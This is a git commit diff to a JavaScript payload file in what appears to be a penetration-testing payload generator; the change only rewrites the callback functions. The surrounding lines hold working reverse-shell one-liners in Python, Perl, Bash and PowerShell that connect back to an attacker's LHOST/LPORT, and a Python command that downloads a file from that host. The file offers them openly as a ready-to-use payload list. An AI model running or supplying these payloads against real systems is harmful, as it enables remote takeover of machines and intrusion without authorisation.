08be25a68cdebea096762bd3b99f2f50ae9d39f5
gabemarshall <gabemarshall@me.com>
2015-06-24 20:14:18 -0400

    Replaced deprecated payload callback method in reverse shell payloads

--- payloads/misc.js
+++ payloads/misc.js
@@ -44,8 +44,10 @@ Load({
 	title: "Reverse Shell Python", 
 	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<PROMPT (shell type)>\",\"-i\"]);'",
 	category: "Reverse Shells",
-	callback: function(returnToPrepare){
-		ncat.Init(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc)", "shell")
+	callback: function(bro){
+		question("Enter the type of shell to use (/bin/sh, cmd.exe, etc");
+		question(ask.ncat);
+		ask.some(questions, bro);
 	}
 })
 
@@ -53,8 +55,10 @@ Load({
 	title: "Reverse Shell Perl",
 	payload: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<PROMPT (shell type)> -i\");};'",
 	category: "Reverse Shells",
-	callback: function(returnToPrepare){
-		ncat.Init(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc)", "shell")
+	callback: function(bro){
+		question("Enter the type of shell to use (/bin/sh, cmd.exe, etc");
+		question(ask.ncat);
+		ask.some(questions, bro);
 	}
 })
 
@@ -62,8 +66,9 @@ Load({
 	title: "Reverse Shell Bash",
 	payload: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
 	category: "Reverse Shells",
-	callback: function(returnToPrepare){
-		ncat.Init(returnToPrepare, null, "shell")
+	callback: function(bro){
+		question(ask.ncat);
+		ask.some(questions, bro);
 	}
 })
 
@@ -73,8 +78,9 @@ Load({
 	title: "Reverse Shell PSH",
 	payload: '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
 	category: "Reverse Shells",
-	callback: function(returnToPrepare){
-		ncat.Init(returnToPrepare, null, "shell")
+	callback: function(bro){
+		question(ask.ncat);
+		ask.some(questions, bro);
 	}
 })
 
@@ -97,7 +103,7 @@ Load({
 	title: "Download File via Python",
 	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","<PATH>");\'',
 	category: "Exfiltration",
-	callback: function(returnToPrepare, lhost, lport, rhost, rport, user, path){
+	callback: function(bro){
 		question("What file would you like to download? (ex: script.sh)");
 		ask.some(questions, bro);
 	}
